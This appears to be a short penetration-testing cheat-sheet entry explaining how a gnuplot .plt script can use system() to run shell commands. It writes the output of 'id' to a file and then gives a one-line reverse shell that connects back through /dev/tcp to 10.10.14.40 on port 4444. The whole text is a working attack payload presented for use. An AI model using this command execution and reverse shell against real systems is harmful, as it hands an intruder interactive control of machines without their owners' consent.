```
Use system command to execute commands
Make .plt file with the following contents:

set print "/tmp/output.txt" 
cmdout = system("id") 
print cmdout

Or get reverse shell:

cmdout = system("/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.14.40/4444 0>&1'") print cmdout

```